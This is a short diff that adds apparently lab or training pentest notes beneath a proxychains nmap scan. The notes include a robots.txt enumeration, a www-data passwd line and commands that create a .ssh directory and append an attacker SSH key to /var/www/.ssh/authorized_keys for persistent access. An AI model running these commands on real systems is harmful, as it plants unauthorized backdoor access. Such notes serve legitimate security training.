@@ -159,6 +159,45 @@ proxychains nmap -T5 --script=smb-os-discovery.nse 192.168.150.245
 
 
 
+robots.txt
+
+User-agent: *
+Allow: /uploads
+Allow: /chat
+Allow: /cmdinjection
+Allow: /java
+Allow: /path
+Allow: /webexample
+Disallow: /cross
+Disallow: /
+
+
+User-agent: Googlebot
+Disallow: /
+
+
+User-agent: Baiduspider
+Disallow: /
+
+
+
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuiheEg7vzDqAJdMfRD54ErLV4WKFen6ePe8cnkR0JuhK4GLQxzQuA9CST0P3dBbq4GWZkT3i7VIVuo1XYHSabZRle2MRrsfD1Bd/hX+l5ACplrvWm6W8xJuImcK5WB95pvIgJ7ftgw5Q23b1yqEVpKj6vZfz0a20bWjIGH5S9lW/Kc4IrgBS876Gs76IYoZWaiTOGqcs4qRSmzIMPXAT+ojvSqkVMczs81vh2VbW5fchu6rPies7qBADGWotvHFdgmh+nwkT3tFJUQTN6qhYzvJmLt836Y4scMt3ifUNjOm0syBOghXf3D1SMYfp40ai0HFmIMERtp3zuuhQen9zN student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+
+
+www-data:x:33:33:www-data:/var/www:/bin/bash
+
+
+
+mkdir /var/www/directory/.ssh
+
+
+
+
+
+
 
 
 
